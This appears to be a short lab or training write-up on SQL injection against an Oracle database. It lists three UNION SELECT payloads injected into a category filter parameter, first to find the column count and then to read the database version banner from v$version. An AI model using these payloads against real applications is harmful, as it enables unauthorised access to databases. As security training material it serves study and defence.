# Querying database version on Oracle

`/filter?category=Pets'+UNION+SELECT+NULL+FROM+dual--`: Internal Server Error

`/filter?category=Pets'+UNION+SELECT+NULL,+NULL+FROM+dual--`: Ok (2 columns)

`/filter?category=Pets'+UNION+SELECT+Banner,+NULL+FROM+v$version--`: Solved
